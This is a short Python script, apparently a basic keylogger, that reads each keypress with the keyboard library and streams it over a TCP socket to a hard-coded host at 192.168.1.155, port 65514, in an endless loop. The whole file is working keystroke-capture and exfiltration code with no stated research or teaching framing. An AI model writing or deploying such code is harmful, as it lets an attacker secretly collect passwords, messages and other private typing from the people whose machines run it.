import keyboard
import socket
import time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
other_ip = "192.168.1.155"
port=65514
s.connect((other_ip,port))

while True:
    key=keyboard.read_key()
    print(key)
    s.send(key.encode())
    time.sleep(0.1)
    
    

